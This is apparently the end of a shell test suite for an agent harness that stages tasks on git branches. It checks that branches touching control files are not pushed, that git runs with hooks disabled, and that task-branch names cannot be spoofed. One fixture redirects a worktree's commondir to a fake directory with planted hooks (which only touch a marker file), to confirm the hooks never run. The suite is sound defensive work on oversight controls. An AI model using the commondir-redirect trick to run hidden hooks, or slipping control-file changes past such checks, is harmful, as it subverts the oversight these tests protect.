}
pushed() { [ -n "$(git --git-dir="$T/pa-origin.git" branch --list "task/$1-x")" ] && echo yes || echo no; }
mkpa T-070 yes; mkpa T-071 no; mkpa T-072 no
: > "$GWLOG"
pushassets T-070
expect "v2 push_assets: branch with control change not pushed" no "$(pushed T-070)"
pushassets T-071
expect "v2 push_assets: clean branch still pushed" yes "$(pushed T-071)"
expect "v2 push_assets: every git add/commit/push carries core.hooksPath=/dev/null + core.fsmonitor=false" yes "$("$PY3" - "$GWLOG" <<'PY'
import sys
calls = [l.rstrip("\n").split("\x1f")[:-1] for l in open(sys.argv[1], encoding="utf-8", errors="replace") if l.strip()]
def sub(a):
    i = 0
    while i < len(a) and a[i] in ("-c", "-C"):
        i += 2
    return a[i] if i < len(a) else ""
def cfg(a):
    return {a[i + 1] for i in range(len(a) - 1) if a[i] == "-c"}
mut = [a for a in calls if sub(a) in ("add", "commit", "push")]
print("yes" if mut and all({"core.hooksPath=/dev/null", "core.fsmonitor=false"} <= cfg(a) for a in mut) else "no")
PY
)"
# worktree 的 commondir 被改指向假公共目录（自带钩子）：不做 git 写操作、不推送、钩子不跑
FC="$T/pa-fakecommon"; mkdir -p "$FC/hooks"
for e in "$PA/.git/"*; do case "$(basename "$e")" in config|hooks|worktrees) ;; *) ln -s "$e" "$FC/$(basename "$e")";; esac; done
ln -s "$PA/.git/worktrees" "$FC/worktrees"; cp "$PA/.git/config" "$FC/config"
for h in pre-commit post-commit pre-push reference-transaction post-index-change; do
  printf '#!/bin/sh\ntouch "%s"\n' "$PAMARK" > "$FC/hooks/$h"; chmod +x "$FC/hooks/$h"
done
printf '%s\n' "$FC" > "$PA/.git/worktrees/T-072/commondir"
pushassets T-072
expect "v2 push_assets: tampered commondir -> planted hook never runs" no "$([ -e "$PAMARK" ] && echo yes || echo no)"
expect "v2 push_assets: tampered commondir -> not pushed" no "$(pushed T-072)"
cd "$T"

# ################################################################ 接口约定 v3（对抗审查第 2 轮）
# N6：srt denyRead 恢复为整个状态树（导出目录在树外）
xrun sandbox-run --root "$RV" --export "$EXSHA" -- bash .harness/verify.sh
expect "v3 export: srt denyRead covers the whole \$XDG_STATE_HOME/harness tree" yes "$("$PY3" - "$SRTLOG" "$XDG" <<'PY'
import glob, json, os, sys
fs = sorted(glob.glob(os.path.join(sys.argv[1], "*.settings.json")))
try:
    dr = [os.path.realpath(os.path.expanduser(p)) for p in json.load(open(fs[-1]))["filesystem"]["denyRead"]]
except Exception:
    dr = []
st = os.path.realpath(os.path.join(sys.argv[2], "harness"))
print("yes" if st in dr and not any(p.startswith(st + "/") for p in dr) else "no")
PY
)"
# N7：git archive 以管道流给解包，不整块读进内存
expect "v3 export: git archive is streamed into the unpacker (no BytesIO / capture_output)" yes "$(HOOKS="$HOOKS" "$PY3" - <<'PY' 2>&1 | tail -1
import inspect, os, re, sys
sys.path.insert(0, os.environ["HOOKS"])
import harness_lib as H
src = inspect.getsource(H.export_commit)
stream = re.search(r"""mode\s*=\s*["']r\|""", src) or re.search(r"""["']tar["']\s*,\s*["']-?x""", src) or "| tar" in src
print("yes" if "archive" in src and stream and "BytesIO" not in src and not re.search(r"archive[^\n]*capture_output", src) else "no")
PY
)"

# N2：默认分支（origin/HEAD → init.defaultBranch → main → master）
mkbr() {  # mkbr <dir> <初始分支>
  mkdir -p "$1" && git -C "$1" init -q -b "$2" && git -C "$1" config user.email t@t && git -C "$1" config user.name t
  mkdir -p "$1/src" "$1/scripts" && echo a > "$1/src/a.js" && echo x > "$1/scripts/x.sh"
  git -C "$1" add -A && git -C "$1" commit -qm init
}
RM="$T/repo-master"; mkbr "$RM" master
git -C "$RM" checkout -q -b b-scripts && echo y >> "$RM/scripts/x.sh" && git -C "$RM" commit -qam s && git -C "$RM" checkout -q master
cd_run "$RM" default-branch
expect "v3 default-branch: master-only repo -> master" "0 master" "$(rc) $(lines)"
cd_run "$T" control-diff b-scripts --root "$RM"
expect "v3 control-diff <branch> uses the default branch (master): exit 1" 1 "$(rc)"
expect "v3 control-diff <branch> uses the default branch (master): lists scripts/x.sh" "scripts/x.sh" "$(lines)"
RTK="$T/repo-trunk"; mkbr "$RTK" trunk
cd_run "$RTK" default-branch
expect "v3 default-branch: none of origin/HEAD, init.defaultBranch, main, master -> exit 2" 2 "$(rc)"
expect "v3 default-branch: message says 默认分支" yes "$(has "$OUT/stderr" 默认分支)"
cd_run "$T" control-diff scripts --root "$RTK"
expect "v3 control-diff <branch> without a default branch: exit 2" 2 "$(rc)"
git -C "$RTK" config init.defaultBranch trunk
cd_run "$RTK" default-branch
expect "v3 default-branch: init.defaultBranch honoured" "0 trunk" "$(rc) $(lines)"
ROH="$T/repo-originhead"; mkbr "$ROH" main
git -C "$ROH" branch dev; git -C "$ROH" update-ref refs/remotes/origin/dev dev
git -C "$ROH" symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/dev
cd_run "$ROH" default-branch
expect "v3 default-branch: origin/HEAD wins over main" "0 dev" "$(rc) $(lines)"
expect "v3 default_branch(): in-process" "master" "$(HOOKS="$HOOKS" RM="$RM" "$PY3" -c 'import os,sys; sys.path.insert(0,os.environ["HOOKS"]); import harness_lib as H; print(H.default_branch(os.environ["RM"]))' 2>&1 | tail -1)"

# N5：task-branch 只接受 ^task/<TID>-
RTB="$T/repo-tb"; mkbr "$RTB" main; mkdir -p "$RTB/.harness/tasks"
tbcard() { printf -- '---\nid: %s\ntitle: x\nstatus: ready\nbranch: %s\n---\n\n# %s x\n' "$1" "$2" "$1" > "$RTB/.harness/tasks/$1-x.md"; }
tbcard T-123 "task/T-123-x"; tbcard T-124 "main"; tbcard T-125 "task/T-041-other"; tbcard T-126 "task/T-1260-x"
tbcard T-127 "worktree-T-127"; tbcard T-128 ""
cd_run "$RTB" task-branch T-123
expect "v3 task-branch: task/T-123-x accepted" "0 task/T-123-x" "$(rc) $(lines)"
for c in "T-124 main" "T-125 another task's branch" "T-126 task/T-1260-x (prefix trick)" "T-127 worktree-T-127"; do
  set -- $c; tid="$1"; shift
  cd_run "$RTB" task-branch "$tid"
  expect "v3 task-branch: $tid rejects $* (exit 1, no output)" "1 " "$(rc) $(lines)"
done
cd_run "$RTB" task-branch T-128
expect "v3 task-branch: empty branch -> default task/T-128-x" "0 task/T-128-x" "$(rc) $(lines)"
cd "$T"

echo "$((N-FAILS))/$N passed"
[ "$FAILS" -eq 0 ]
